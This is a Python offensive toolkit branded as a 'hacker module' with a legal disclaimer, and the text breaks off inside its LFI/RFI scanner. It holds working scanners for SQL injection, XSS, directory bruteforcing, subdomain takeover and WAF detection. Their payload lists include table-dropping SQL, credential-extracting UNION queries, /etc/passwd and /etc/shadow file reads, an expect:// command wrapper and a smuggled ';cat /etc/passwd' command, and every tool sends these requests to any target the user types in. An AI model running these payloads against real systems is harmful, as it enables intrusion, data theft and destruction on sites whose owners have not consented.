#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════╗
# ║  KyyInfinite HACKER MODULE v3.0                         ║
# ║  Advanced Penetration Testing & Security Tools           ║
# ║  Author: KyyInfinite                                     ║
# ║                                                          ║
# ║  ⚠ FOR AUTHORIZED PENETRATION TESTING ONLY ⚠            ║
# ║  Unauthorized access to systems is ILLEGAL.              ║
# ║  Use responsibly. You are responsible for your actions.   ║
# ╚══════════════════════════════════════════════════════════╝

import sys,os,json,time,hashlib,base64,random,string,re
import socket,struct,threading,urllib.parse,urllib.request
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

# ═══════════════════════════════════════════
#  UI ENGINE
# ═══════════════════════════════════════════
class C:
    RST='\033[0m';BLD='\033[1m';DIM='\033[2m';ITA='\033[3m';UND='\033[4m';BLK='\033[5m'
    R='\033[31m';G='\033[32m';Y='\033[33m';B='\033[34m';M='\033[35m';C='\033[36m';W='\033[37m'
    RB='\033[91m';GB='\033[92m';YB='\033[93m';BB='\033[94m';MB='\033[95m';CB='\033[96m';WB='\033[97m'
    BGR='\033[41m';BGG='\033[42m';BGY='\033[43m';BGB='\033[44m';BGM='\033[45m'
    @staticmethod
    def x(n):return f'\033[38;5;{n}m'
    @staticmethod
    def bg(n):return f'\033[48;5;{n}m'
    @staticmethod
    def rgb(r,g,b):return f'\033[38;2;{r};{g};{b}m'
o=C

class HUI:
    @staticmethod
    def skull():
        print()
        print(f"    {o.x(196)}    ██████████████████████████{o.RST}")
        print(f"    {o.x(196)}    █{o.x(208)}░░░░░░░░░░░░░░░░░░░░░░░░{o.x(196)}█{o.RST}")
        print(f"    {o.x(196)}    █{o.x(208)}░░░{o.WB}▄▀▀▀▄{o.x(208)}░░░░░░░{o.WB}▄▀▀▀▄{o.x(208)}░░░{o.x(196)}█{o.RST}")
        print(f"    {o.x(196)}    █{o.x(208)}░░░{o.WB}█ ◉ █{o.x(208)}░░{o.x(196)}▄▀▀▀▄{o.x(208)}░{o.WB}█ ◉ █{o.x(208)}░░░{o.x(196)}█{o.RST}")
        print(f"    {o.x(196)}    █{o.x(208)}░░░{o.WB}▀▄▄▄▀{o.x(208)}░░{o.x(196)}▀▄▄▄▀{o.x(208)}░{o.WB}▀▄▄▄▀{o.x(208)}░░░{o.x(196)}█{o.RST}")
        print(f"    {o.x(196)}    █{o.x(208)}░░░░░░{o.x(196)}▀▀▀▀▀▀▀▀▀▀▀▀▀{o.x(208)}░░░░░░{o.x(196)}█{o.RST}")
        print(f"    {o.x(196)}    ██████████████████████████{o.RST}")
        print()

    @staticmethod
    def banner(title):
        print()
        print(f"    {o.x(196)}{'━'*52}{o.RST}")
        print(f"    {o.x(196)}┃{o.RST} {o.BLD}{o.x(196)}☠ {o.x(208)}{title}{o.RST}")
        print(f"    {o.x(196)}{'━'*52}{o.RST}")
        print()

    @staticmethod
    def box_top(w=52,title=""):
        print(f"    {o.x(88)}╔{'═'*(w-2)}╗{o.RST}")
        if title:
            pad=max(w-4-len(title),0)
            print(f"    {o.x(88)}║{o.RST} {o.BLD}{o.x(196)}{title}{o.RST}{' '*pad}{o.x(88)}║{o.RST}")
            print(f"    {o.x(88)}╠{'═'*(w-2)}╣{o.RST}")

    @staticmethod
    def box_line(w=52,text=""):
        clean=re.sub(r'\033\[[0-9;]*m','',text);pad=max(w-3-len(clean),0)
        print(f"    {o.x(88)}║{o.RST} {text}{' '*pad}{o.x(88)}║{o.RST}")

    @staticmethod
    def box_empty(w=52):print(f"    {o.x(88)}║{' '*(w-2)}║{o.RST}")
    @staticmethod
    def box_sep(w=52):print(f"    {o.x(88)}╟{'─'*(w-2)}╢{o.RST}")
    @staticmethod
    def box_bottom(w=52):print(f"    {o.x(88)}╚{'═'*(w-2)}╝{o.RST}")
    @staticmethod
    def ok(m):print(f"    {o.GB}✓ {o.W}{m}{o.RST}")
    @staticmethod
    def fail(m):print(f"    {o.RB}✗ {o.W}{m}{o.RST}")
    @staticmethod
    def warn(m):print(f"    {o.YB}⚠ {o.W}{m}{o.RST}")
    @staticmethod
    def info(m):print(f"    {o.CB}ℹ {o.W}{m}{o.RST}")

    @staticmethod
    def progress(text,duration=2):
        w=35
        for i in range(w+1):
            p=i*100//w;bar='█'*i+'░'*(w-i)
            cols=[o.x(196),o.x(202),o.x(208),o.x(214)]
            cl=cols[min(i*len(cols)//(w+1),len(cols)-1)]
            sys.stdout.write(f"\r    {o.x(245)}{text} {o.x(88)}▐{cl}{bar}{o.x(88)}▌ {cl}{p:3d}%{o.RST}")
            sys.stdout.flush();time.sleep(duration/w)
        print(f" {o.GB}✓{o.RST}")

    @staticmethod
    def spin(text,dur=2):
        fr=['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏'];end=time.time()+dur;i=0
        while time.time()<end:
            sys.stdout.write(f"\r    {o.x(196)}{fr[i]} {o.x(208)}{text}{o.RST}  ")
            sys.stdout.flush();i=(i+1)%len(fr);time.sleep(0.1)
        print(f"\r    {o.GB}✓ {o.W}{text}{o.RST}{'  '*10}")

    @staticmethod
    def inp(text):return input(f"    {o.x(196)}☠ {o.YB}{text}: {o.GB}")
    @staticmethod
    def pause():input(f"\n    {o.YB}Press [ENTER]{o.RST}")

    @staticmethod
    def disclaimer():
        w=52
        print()
        print(f"    {o.BGR}{o.WB}{o.BLD}{'  ⚠  WARNING — READ BEFORE PROCEEDING  ⚠  ':^52}{o.RST}")
        print()
        HUI.box_top(w,"⚠ LEGAL DISCLAIMER")
        HUI.box_empty(w)
        HUI.box_line(w,f" {o.RB}This module is for AUTHORIZED testing ONLY.{o.RST}")
        HUI.box_line(w,f" {o.RB}Unauthorized access is a CRIMINAL OFFENSE.{o.RST}")
        HUI.box_line(w,f"")
        HUI.box_line(w,f" {o.YB}By proceeding, you confirm:{o.RST}")
        HUI.box_line(w,f" {o.x(245)}• You have written authorization{o.RST}")
        HUI.box_line(w,f" {o.x(245)}• You own or have permission for the target{o.RST}")
        HUI.box_line(w,f" {o.x(245)}• You accept all legal responsibility{o.RST}")
        HUI.box_line(w,f" {o.x(245)}• You understand local cybercrime laws{o.RST}")
        HUI.box_empty(w)
        HUI.box_line(w,f" {o.x(245)}Author: {o.x(39)}KyyInfinite{o.RST}")
        HUI.box_line(w,f" {o.x(245)}\"With great power comes great responsibility\"{o.RST}")
        HUI.box_empty(w)
        HUI.box_bottom(w)
        print()
        agree=HUI.inp("Type 'AGREE' to continue");print(o.RST)
        return agree.strip().upper()=="AGREE"


def http_get(url,timeout=10,headers=None):
    try:
        req=urllib.request.Request(url)
        req.add_header('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
        if headers:
            for k,v in headers.items():req.add_header(k,v)
        with urllib.request.urlopen(req,timeout=timeout) as resp:
            return resp.read().decode('utf-8',errors='ignore'),resp.status,dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.read().decode('utf-8',errors='ignore') if hasattr(e,'read') else str(e),e.code,{}
    except Exception as e:return str(e),0,{}


# ═══════════════════════════════════════════
#  HACK 01: SQL INJECTION SCANNER
# ═══════════════════════════════════════════
def hack_sqli_scanner():
    HUI.banner("💉 SQL INJECTION SCANNER")
    url=HUI.inp("Target URL with parameter\n    (e.g. http://site.com/page?id=1)");print(o.RST)
    if not url or '?' not in url:HUI.fail("URL must contain ? parameter");return

    payloads=[
        ("' OR '1'='1","Basic OR"),
        ("' OR '1'='1'--","Comment bypass"),
        ("' OR '1'='1'/*","Comment bypass 2"),
        ("' UNION SELECT NULL--","UNION NULL"),
        ("' UNION SELECT 1,2,3--","UNION 123"),
        ("1' AND '1'='1","AND true"),
        ("1' AND '1'='2","AND false"),
        ("' OR 1=1#","Hash comment"),
        ("admin'--","Admin bypass"),
        ("1' ORDER BY 1--","Order By"),
        ("1' ORDER BY 100--","Order By OOB"),
        ("' OR ''='","Empty string"),
        ("1; DROP TABLE users--","Drop table"),
        ("1' AND SLEEP(3)--","Time-based blind"),
        ("1' AND 1=CONVERT(int,(SELECT @@version))--","Error-based MSSQL"),
        ("' UNION SELECT username,password FROM users--","Data extract"),
        ("1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--","XML error"),
        ("' OR EXISTS(SELECT * FROM users)--","EXISTS"),
        ("-1' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables--","Schema dump"),
        ("' AND BENCHMARK(5000000,SHA1('test'))--","Benchmark blind"),
    ]

    # Extract base URL and parameter
    parsed=urllib.parse.urlparse(url)
    params=urllib.parse.parse_qs(parsed.query)
    base=url.split('?')[0]

    HUI.progress(f"Testing {len(payloads)} SQLi payloads...",2)
    print()

    w=56;HUI.box_top(w,"SQLi SCAN RESULTS");HUI.box_empty(w)
    HUI.box_line(w,f" {o.YB}Target {o.x(245)}: {o.x(87)}{url[:40]}{o.RST}")
    HUI.box_line(w,f" {o.YB}Params {o.x(245)}: {o.x(87)}{', '.join(params.keys())}{o.RST}")
    HUI.box_sep(w)

    vulns=[]
    error_sigs=['sql syntax','mysql','sqlite','postgresql','oracle','microsoft sql',
                'unclosed quotation','syntax error','sql error','database error',
                'warning: mysql','you have an error','supplied argument is not',
                'pg_query','unterminated','odbc','jdbc','ORA-','DB2 SQL']

    for param_name in params:
        HUI.box_line(w,f" {o.x(213)}Testing param: {o.WB}{param_name}{o.RST}")
        original_val=params[param_name][0]

        for payload,desc in payloads:
            test_params=dict(params)
            test_params[param_name]=[original_val+payload]
            query=urllib.parse.urlencode({k:v[0] for k,v in test_params.items()})
            test_url=f"{base}?{query}"

            sys.stdout.write(f"\r    {o.x(245)}Testing: {desc[:30]}{' '*20}{o.RST}")
            sys.stdout.flush()

            body,status,_=http_get(test_url,timeout=8)
            body_lower=body.lower()

            vulnerable=False
            vuln_type=""

            # Check for SQL errors in response
            for sig in error_sigs:
                if sig.lower() in body_lower:
                    vulnerable=True
                    vuln_type=f"Error-based ({sig})"
                    break

            # Check for blind SQLi indicators
            if not vulnerable and 'SLEEP' in payload:
                t1=time.time()
                _,_,_=http_get(test_url,timeout=15)
                elapsed=time.time()-t1
                if elapsed>2.5:
                    vulnerable=True
                    vuln_type=f"Time-based blind ({elapsed:.1f}s delay)"

            # Check for boolean-based
            if not vulnerable and ("1'='1" in payload or "1=1" in payload):
                # Compare with false condition
                false_params=dict(params)
                false_params[param_name]=[original_val+"' AND '1'='2"]
                false_query=urllib.parse.urlencode({k:v[0] for k,v in false_params.items()})
                false_body,_,_=http_get(f"{base}?{false_query}",timeout=8)
                if len(body)!=len(false_body) and abs(len(body)-len(false_body))>50:
                    vulnerable=True
                    vuln_type=f"Boolean-based (diff: {abs(len(body)-len(false_body))} bytes)"

            if vulnerable:
                vulns.append((param_name,payload,desc,vuln_type))
                print(f"\r    {o.RB}☠ VULNERABLE! {o.WB}{desc}{o.RST}{' '*20}")
                HUI.box_line(w,f"   {o.RB}☠ {o.WB}{desc}{o.RST}")
                HUI.box_line(w,f"     {o.x(245)}Payload: {o.x(87)}{payload[:38]}{o.RST}")
                HUI.box_line(w,f"     {o.x(245)}Type: {o.RB}{vuln_type[:38]}{o.RST}")
                HUI.box_line(w,"")

    print(f"\r{' '*60}")
    HUI.box_sep(w)
    if vulns:
        HUI.box_line(w,f" {o.RB}☠ TOTAL VULNERABILITIES: {o.WB}{len(vulns)}{o.RST}")
        HUI.box_line(w,f" {o.x(245)}Target is likely VULNERABLE to SQLi!{o.RST}")
    else:
        HUI.box_line(w,f" {o.GB}✓ No SQLi vulnerabilities detected{o.RST}")
        HUI.box_line(w,f" {o.x(245)}(May need manual testing){o.RST}")
    HUI.box_empty(w);HUI.box_bottom(w)


# ═══════════════════════════════════════════
#  HACK 02: XSS SCANNER
# ═══════════════════════════════════════════
def hack_xss_scanner():
    HUI.banner("⚡ XSS VULNERABILITY SCANNER")
    url=HUI.inp("Target URL with parameter\n    (e.g. http://site.com/search?q=test)");print(o.RST)
    if not url or '?' not in url:HUI.fail("URL must contain ? parameter");return

    payloads=[
        ('<script>alert("XSS")</script>','Basic script tag'),
        ('<img src=x onerror=alert("XSS")>','IMG onerror'),
        ('<svg onload=alert("XSS")>','SVG onload'),
        ('"><script>alert("XSS")</script>','Quote break + script'),
        ("'><script>alert('XSS')</script>",'Single quote break'),
        ('<body onload=alert("XSS")>','Body onload'),
        ('<iframe src="javascript:alert(1)">','Iframe javascript'),
        ('<input onfocus=alert(1) autofocus>','Input autofocus'),
        ('<details open ontoggle=alert(1)>','Details ontoggle'),
        ('<marquee onstart=alert(1)>','Marquee onstart'),
        ('javascript:alert(1)','Javascript protocol'),
        ('<a href="javascript:alert(1)">click</a>','Anchor javascript'),
        ('<div style="background:url(javascript:alert(1))">','CSS expression'),
        ('{{7*7}}','Template injection'),
        ('${7*7}','Template literal'),
        ('<math><mtext><table><mglyph><svg><mtext><textarea><path d="M0,0">','Polyglot'),
        ('<ScRiPt>alert(1)</ScRiPt>','Mixed case'),
        ('<scr<script>ipt>alert(1)</scr</script>ipt>','Nested tags'),
        ('"><img src=x onerror=prompt(1)>','Prompt variant'),
        ('%3Cscript%3Ealert(1)%3C/script%3E','URL encoded'),
    ]

    parsed=urllib.parse.urlparse(url)
    params=urllib.parse.parse_qs(parsed.query)
    base=url.split('?')[0]

    HUI.progress(f"Testing {len(payloads)} XSS payloads...",2);print()

    w=56;HUI.box_top(w,"XSS SCAN RESULTS");HUI.box_empty(w)
    HUI.box_line(w,f" {o.YB}Target {o.x(245)}: {o.x(87)}{url[:40]}{o.RST}")
    HUI.box_sep(w)

    vulns=[]
    for param_name in params:
        HUI.box_line(w,f" {o.x(213)}Testing param: {o.WB}{param_name}{o.RST}")

        for payload,desc in payloads:
            test_params=dict(params)
            test_params[param_name]=[payload]
            query=urllib.parse.urlencode({k:v[0] for k,v in test_params.items()})
            test_url=f"{base}?{query}"

            sys.stdout.write(f"\r    {o.x(245)}Testing: {desc[:30]}{' '*20}{o.RST}");sys.stdout.flush()

            body,status,_=http_get(test_url,timeout=8)

            # Check if payload is reflected
            reflected=False
            if payload in body:
                reflected=True
            elif payload.replace('"',"'") in body:
                reflected=True
            elif urllib.parse.unquote(payload) in body:
                reflected=True

            if reflected:
                vuln_type="Reflected XSS"
                # Check if it's in a dangerous context
                if '<script' in body.lower() and payload.lower() in body.lower():
                    vuln_type="Reflected XSS (Script context)"
                elif 'onerror' in body.lower() or 'onload' in body.lower():
                    vuln_type="Reflected XSS (Event handler)"

                vulns.append((param_name,payload,desc,vuln_type))
                print(f"\r    {o.RB}☠ REFLECTED! {o.WB}{desc}{o.RST}{' '*20}")
                HUI.box_line(w,f"   {o.RB}☠ {o.WB}{desc}{o.RST}")
                HUI.box_line(w,f"     {o.x(245)}Type: {o.RB}{vuln_type}{o.RST}")
                HUI.box_line(w,"")

    print(f"\r{' '*60}")
    HUI.box_sep(w)
    if vulns:
        HUI.box_line(w,f" {o.RB}☠ FOUND {len(vulns)} XSS VECTORS{o.RST}")
    else:
        HUI.box_line(w,f" {o.GB}✓ No reflected XSS found{o.RST}")
    HUI.box_empty(w);HUI.box_bottom(w)


# ═══════════════════════════════════════════
#  HACK 03: DIRECTORY BRUTEFORCER
# ═══════════════════════════════════════════
def hack_dir_bruteforce():
    HUI.banner("📂 DIRECTORY BRUTEFORCER")
    target=HUI.inp("Target URL (e.g. https://example.com)");print(o.RST)
    if not target:HUI.fail("Empty!");return
    if not target.startswith('http'):target='https://'+target
    target=target.rstrip('/')

    wordlists={
        'common':[
            '.git','.env','.htaccess','.htpasswd','.svn','.DS_Store',
            'robots.txt','sitemap.xml','crossdomain.xml','security.txt',
            'admin','administrator','login','dashboard','panel','manage',
            'wp-admin','wp-content','wp-includes','wp-login.php',
            'api','api/v1','api/v2','graphql','swagger','docs',
            'backup','backups','bak','old','temp','tmp','test',
            'config','configuration','conf','settings','setup',
            'upload','uploads','files','media','images','img','static',
            'js','css','assets','public','private','secret','hidden',
            'db','database','sql','mysql','phpmyadmin','adminer',
            'cgi-bin','bin','scripts','include','includes',
            'vendor','node_modules','bower_components',
            'server-status','server-info','info.php','phpinfo.php',
            'debug','trace','console','terminal','shell',
            'user','users','account','accounts','profile','register',
            'log','logs','error','errors','error_log','access_log',
            'cron','crontab','cronjob','jobs','tasks',
            'mail','email','webmail','smtp','imap',
            'ftp','sftp','ssh','telnet','remote',
            'download','downloads','archive','archives',
            'blog','forum','chat','support','help','faq',
            'wp-json','rest','xmlrpc.php','feed','rss',
            'install','installer','update','upgrade',
            'payment','checkout','cart','shop','store',
            'staging','dev','development','prod','production',
            'docker','dockerfile','docker-compose.yml',
            'Makefile','Gruntfile.js','Gulpfile.js','package.json',
            'composer.json','Gemfile','requirements.txt',
            '.well-known','acme-challenge',
        ],
    }

    paths=wordlists['common']
    ext_input=HUI.inp("File extensions (default: php,html,txt,bak)\n    (comma-separated or ENTER)");print(o.RST)
    exts=(ext_input or 'php,html,txt,bak').split(',')
    exts=[e.strip().lstrip('.') for e in exts]

    # Add extensions to paths
    extended=list(paths)
    for p in paths[:30]:
        for ext in exts:
            extended.append(f"{p}.{ext}")

    thread_count=HUI.inp("Threads (default 10)");print(o.RST)
    thread_count=int(thread_count) if thread_count.isdigit() else 10

    HUI.progress(f"Bruteforcing {len(extended)} paths ({thread_count} threads)...",2)
    print()

    w=56;HUI.box_top(w,f"DIRBRUTE — {urllib.parse.urlparse(target).netloc}")
    HUI.box_empty(w)
    HUI.box_line(w,f" {o.YB}Target  {o.x(245)}: {o.x(87)}{target}{o.RST}")
    HUI.box_line(w,f" {o.YB}Paths   {o.x(245)}: {o.x(87)}{len(extended)}{o.RST}")
    HUI.box_line(w,f" {o.YB}Threads {o.x(245)}: {o.x(87)}{thread_count}{o.RST}")
    HUI.box_sep(w)

    found=[];scanned=[0]

    def check_path(path):
        url=f"{target}/{path}"
        try:
            req=urllib.request.Request(url,method='HEAD')
            req.add_header('User-Agent','Mozilla/5.0')
            with urllib.request.urlopen(req,timeout=5) as resp:
                return path,resp.status,len(resp.read()) if resp.status==200 else 0
        except urllib.error.HTTPError as e:
            if e.code in (200,301,302,403):return path,e.code,0
            return path,e.code,0
        except:return path,0,0

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures={executor.submit(check_path,p):p for p in extended}
        for future in as_completed(futures):
            scanned[0]+=1
            path,status,size=future.result()
            if status in (200,301,302,403):
                sc={200:o.GB,301:o.YB,302:o.YB,403:o.RB}.get(status,o.x(245))
                tag={200:'FOUND',301:'REDIRECT',302:'REDIRECT',403:'FORBIDDEN'}.get(status,'?')
                found.append((path,status,tag))
                print(f"    {sc}[{status}] {o.W}/{path}{o.RST}")

            if scanned[0]%20==0:
                sys.stdout.write(f"\r    {o.x(245)}Progress: {scanned[0]}/{len(extended)}{' '*20}{o.RST}")
                sys.stdout.flush()

    print(f"\r{' '*60}")
    HUI.box_sep(w)

    if found:
        HUI.box_line(w,f" {o.x(213)}🎯 RESULTS ({len(found)} found){o.RST}")
        for path,status,tag in sorted(found,key=lambda x:x[1]):
            sc={200:o.GB,301:o.YB,302:o.YB,403:o.RB}.get(status,o.x(245))
            HUI.box_line(w,f"   {sc}[{status}]{o.RST} {o.W}/{path}{o.RST}")
    else:
        HUI.box_line(w,f" {o.x(245)}No interesting paths found{o.RST}")

    HUI.box_empty(w);HUI.box_bottom(w)


# ═══════════════════════════════════════════
#  HACK 04: SUBDOMAIN TAKEOVER CHECKER
# ═══════════════════════════════════════════
def hack_subdomain_takeover():
    HUI.banner("🏴 SUBDOMAIN TAKEOVER CHECKER")
    domain=HUI.inp("Target domain (e.g. example.com)");print(o.RST)
    if not domain:HUI.fail("Empty!");return

    # Fingerprints for takeover
    fingerprints={
        'GitHub Pages':['There isn\'t a GitHub Pages site here','For root URLs'],
        'Heroku':['No such app','herokucdn.com/error-pages'],
        'AWS S3':['NoSuchBucket','The specified bucket does not exist'],
        'Shopify':['Sorry, this shop is currently unavailable','Only one step left'],
        'Tumblr':['There\'s nothing here','Whatever you were looking for'],
        'WordPress.com':['Do you want to register'],
        'Zendesk':['Help Center Closed','this help center no longer exists'],
        'Fastly':['Fastly error: unknown domain'],
        'Ghost':['The thing you were looking for is no longer here'],
        'Surge.sh':['project not found'],
        'Bitbucket':['Repository not found'],
        'Pantheon':['The gods are wise','404 error unknown site'],
        'UserVoice':['This UserVoice subdomain is currently available'],
        'Squarespace':['No Such Account'],
        'Strikingly':['page not found','But if you'],
        'Webflow':['The page you are looking for doesn\'t exist'],
        'Netlify':['Not Found - Request ID'],
        'Fly.io':['404 Not Found'],
        'Vercel':['DEPLOYMENT_NOT_FOUND'],
        'Azure':['404 Web Site not found'],
    }

    subs=['www','mail','ftp','admin','blog','dev','api','staging','test',
          'portal','shop','store','app','m','mobile','cdn','ns1','ns2',
          'smtp','vpn','remote','secure','static','media','img','docs',
          'wiki','forum','support','help','status','dashboard','panel',
          'git','ci','beta','demo','old','new','v2','auth','sso',
          'login','pay','billing','cloud','data','db','redis','elastic',
          'search','monitor','analytics','track','video','stream']

    HUI.progress(f"Checking {len(subs)} subdomains...",2);print()

    w=56;HUI.box_top(w,f"TAKEOVER CHECK — {domain}");HUI.box_empty(w)

    takeover_possible=[]
    dangling=[]

    for sub in subs:
        full=f"{sub}.{domain}"
        sys.stdout.write(f"\r    {o.x(245)}Checking: {full}{' '*20}{o.RST}");sys.stdout.flush()

        # DNS check
        try:
            ip=socket.gethostbyname(full)
        except socket.gaierror:
            # NXDOMAIN — check if CNAME exists
            try:
                # Check CNAME
                import subprocess
                result=subprocess.run(['host','-t','CNAME',full],capture_output=True,text=True,timeout=5)
                if 'alias' in result.stdout.lower() or 'cname' in result.stdout.lower():
                    cname=result.stdout.strip().split()[-1] if result.stdout.strip() else 'unknown'
                    dangling.append((full,cname))
                    print(f"\r    {o.RB}⚠ DANGLING CNAME: {o.W}{full} → {cname}{o.RST}{' '*10}")
            except:pass
            continue

        # HTTP check for takeover fingerprints
        for proto in ['https','http']:
            try:
                body,status,_=http_get(f"{proto}://{full}",timeout=5)
                for service,sigs in fingerprints.items():
                    for sig in sigs:
                        if sig.lower() in body.lower():
                            takeover_possible.append((full,service,sig[:30]))
                            print(f"\r    {o.RB}☠ TAKEOVER! {o.W}{full} → {service}{o.RST}{' '*10}")
                            break
                break
            except:continue

    print(f"\r{' '*60}")
    HUI.box_sep(w)

    if takeover_possible:
        HUI.box_line(w,f" {o.RB}☠ TAKEOVER POSSIBLE ({len(takeover_possible)}){o.RST}")
        for sub,svc,sig in takeover_possible:
            HUI.box_line(w,f"   {o.RB}● {o.W}{sub}{o.RST}")
            HUI.box_line(w,f"     {o.x(245)}Service: {o.x(208)}{svc}{o.RST}")

    if dangling:
        HUI.box_sep(w)
        HUI.box_line(w,f" {o.YB}⚠ DANGLING CNAMEs ({len(dangling)}){o.RST}")
        for sub,cname in dangling:
            HUI.box_line(w,f"   {o.YB}● {o.W}{sub}{o.RST}")
            HUI.box_line(w,f"     {o.x(245)}→ {cname}{o.RST}")

    if not takeover_possible and not dangling:
        HUI.box_line(w,f" {o.GB}✓ No takeover vulnerabilities found{o.RST}")

    HUI.box_empty(w);HUI.box_bottom(w)


# ═══════════════════════════════════════════
#  HACK 05: WAF DETECTOR & FINGERPRINTER
# ═══════════════════════════════════════════
def hack_waf_detect():
    HUI.banner("🛡️ WAF DETECTOR & FINGERPRINTER")
    url=HUI.inp("Target URL");print(o.RST)
    if not url:HUI.fail("Empty!");return
    if not url.startswith('http'):url='https://'+url

    HUI.spin("Detecting WAF...",2)

    # WAF signatures
    waf_sigs={
        'Cloudflare':{'headers':['cf-ray','cf-cache-status','__cfduid','cf-request-id'],'body':['cloudflare','attention required','cf-error'],'server':['cloudflare']},
        'AWS WAF':{'headers':['x-amzn-requestid','x-amz-cf-id'],'body':['aws','amazon'],'server':['awselb','amazons3']},
        'Akamai':{'headers':['x-akamai-transformed','akamai'],'body':['akamai','access denied'],'server':['akamai','ghost']},
        'Imperva/Incapsula':{'headers':['x-iinfo','x-cdn'],'body':['incapsula','imperva','_incap_'],'server':['imperva']},
        'Sucuri':{'headers':['x-sucuri-id','x-sucuri-cache'],'body':['sucuri','access denied','sucuri website firewall'],'server':['sucuri']},
        'ModSecurity':{'headers':['modsecurity'],'body':['modsecurity','mod_security','not acceptable'],'server':['modsecurity']},
        'F5 BIG-IP':{'headers':['x-wa-info','bigipserver'],'body':['the requested url was rejected'],'server':['big-ip','bigip']},
        'Barracuda':{'headers':['barra_counter_session'],'body':['barracuda'],'server':['barracuda']},
        'Fortinet/FortiWeb':{'headers':['fortiwafsid'],'body':['fortigate','fortinet','fortiweb'],'server':['fortiweb']},
        'DDoS-Guard':{'headers':['ddos-guard'],'body':['ddos-guard'],'server':['ddos-guard']},
        'Wordfence':{'headers':[],'body':['wordfence','wfwaf','generated by wordfence'],'server':[]},
        'Comodo':{'headers':[],'body':['comodo','protected by comodo'],'server':['comodo']},
    }

    # Normal request
    body_norm,status_norm,headers_norm=http_get(url)

    # Malicious request (trigger WAF)
    attack_payloads=[
        f"{url}?id=1' OR 1=1--",
        f"{url}?q=<script>alert(1)</script>",
        f"{url}?file=../../../etc/passwd",
        f"{url}?cmd=;cat /etc/passwd",
    ]

    detected_wafs=[]
    all_headers={k.lower():v for k,v in headers_norm.items()}
    server=all_headers.get('server','').lower()

    for waf_name,sigs in waf_sigs.items():
        score=0
        reasons=[]

        # Check headers
        for sig in sigs['headers']:
            if sig.lower() in all_headers:
                score+=3;reasons.append(f"Header: {sig}")

        # Check server
        for sig in sigs['server']:
            if sig.lower() in server:
                score+=3;reasons.append(f"Server: {sig}")

        # Check body
        for sig in sigs['body']:
            if sig.lower() in body_norm.lower():
                score+=2;reasons.append(f"Body: {sig}")

        if score>=2:
            detected_wafs.append((waf_name,score,reasons))

    # Try attack payloads
    waf_blocked=False
    for payload_url in attack_payloads:
        body_atk,status_atk,headers_atk=http_get(payload_url,timeout=8)
        if status_atk in (403,406,429,503):
            waf_blocked=True
            # Check response for more WAF fingerprints
            for waf_name,sigs in waf_sigs.items():
                for sig in sigs['body']:
                    if sig.lower() in body_atk.lower():
                        already=any(w[0]==waf_name for w in detected_wafs)
                        if not already:
                            detected_wafs.append((waf_name,5,[f"Blocked({status_atk}): {sig}"]))
            break

    # Display
    w=52;HUI.box_top(w,"WAF DETECTION RESULTS");HUI.box_empty(w)
    HUI.box_line(w,f" {o.YB}Target     {o.x(245)}: {o.x(87)}{url[:35]}{o.RST}")
    HUI.box_line(w,f" {o.YB}Status     {o.x(245)}: {o.GB}{status_norm}{o.RST}")
    HUI.box_line(w,f" {o.YB}Server     {o.x(245)}: {o.x(87)}{server or 'Hidden'}{o.RST}")
    HUI.box_line(w,f" {o.YB}Blocked    {o.x(245)}: {(o.RB+'YES') if waf_blocked else (o.GB+'NO')}{o.RST}")
    HUI.box_sep(w)

    if detected_wafs:
        detected_wafs.sort(key=lambda x:-x[1])
        HUI.box_line(w,f" {o.RB}🛡️ WAF DETECTED!{o.RST}")
        for waf_name,score,reasons in detected_wafs:
            conf="HIGH" if score>=5 else("MEDIUM" if score>=3 else "LOW")
            cc=o.RB if conf=="HIGH" else(o.YB if conf=="MEDIUM" else o.x(245))
            HUI.box_line(w,f"   {o.x(208)}● {o.WB}{waf_name}{o.RST}")
            HUI.box_line(w,f"     {o.x(245)}Confidence: {cc}{conf} ({score}){o.RST}")
            for r in reasons[:3]:
                HUI.box_line(w,f"     {o.x(240)}→ {r[:35]}{o.RST}")
    else:
        HUI.box_line(w,f" {o.GB}✓ No WAF detected{o.RST}")
        HUI.box_line(w,f" {o.x(245)}(Target may be unprotected){o.RST}")

    HUI.box_empty(w);HUI.box_bottom(w)


# ═══════════════════════════════════════════
#  HACK 06: LFI/RFI SCANNER
# ═══════════════════════════════════════════
def hack_lfi_scanner():
    HUI.banner("📄 LFI/RFI SCANNER")
    url=HUI.inp("URL with file param\n    (e.g. http://site.com/page?file=home)");print(o.RST)
    if not url or '?' not in url:HUI.fail("Need URL with parameter");return

    lfi_payloads=[
        ("../../../etc/passwd","Linux passwd","/bin/bash\\|root:"),
        ("....//....//....//etc/passwd","Filter bypass","root:"),
        ("..%2F..%2F..%2Fetc%2Fpasswd","URL encoded","root:"),
        ("....\\/....\\/....\\/etc/passwd","Backslash bypass","root:"),
        ("/etc/passwd","Absolute path","root:"),
        ("../../../etc/shadow","Shadow file","root:"),
        ("../../../etc/hosts","Hosts file","localhost"),
        ("../../../proc/self/environ","Proc environ","PATH="),
        ("../../../var/log/apache2/access.log","Apache log","GET /"),
        ("../../../var/log/nginx/access.log","Nginx log","GET /"),
        ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","Windows hosts","localhost"),
        ("..\\..\\..\\windows\\win.ini","Win.ini","[extensions]"),
        ("php://filter/convert.base64-encode/resource=index.php","PHP filter","PD"),
        ("php://input","PHP input",""),
        ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+","PHP data",""),
        ("expect://id","Expect wrapper","uid="),
        ("/proc/version","Proc version","Linux"),
        ("/proc/self/cmdline","Proc cmdline",""),
        ("....//....//....//etc/issue","OS Issue",""),
        ("..%252f..%252f..%252fetc%252fpasswd","Double encode","root:"),
    ]

    parsed=urllib.parse.urlparse(url)
    params=urllib.parse.parse_qs(parsed.query)
    base=url.split('?')[0]

    HUI.progress(f"Testing {len(lfi_payloads)} LFI payloads...",2);print()

    w=56;HUI.box_top(w,"LFI/RFI RESULTS");HUI.box_empty(w)
    HUI.box_line(w,f" {o.YB}Target {o.x(245)}: {o.x(87)}{url[:40]}{o.RST}")
    HUI.box_sep(w)

    vulns=[]
    for param_name in params:
